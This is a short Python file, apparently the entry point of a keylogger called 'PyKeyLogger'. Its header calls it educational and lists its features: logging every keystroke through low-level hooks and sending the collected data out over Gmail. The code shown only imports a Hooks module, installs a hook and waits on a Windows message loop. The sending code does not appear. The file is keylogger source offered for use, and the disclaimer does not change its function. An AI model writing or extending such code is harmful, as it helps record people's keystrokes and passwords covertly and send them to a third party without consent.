'''
PyKeyLogger is an educational project with non malicious intent

Features
	1- Logging All Keys (even the control keys)
	2- Sending The Collected Data over gmail (encrypted files)
	3- Lowlevel hooks for keys logging
'''

from Hooks import *
hook.install_hook(ptr)
msg = MSG()                             # MSG data structure
user32.GetMessageA(byref(msg), 0, 0, 0) # Wait for messages to be posted
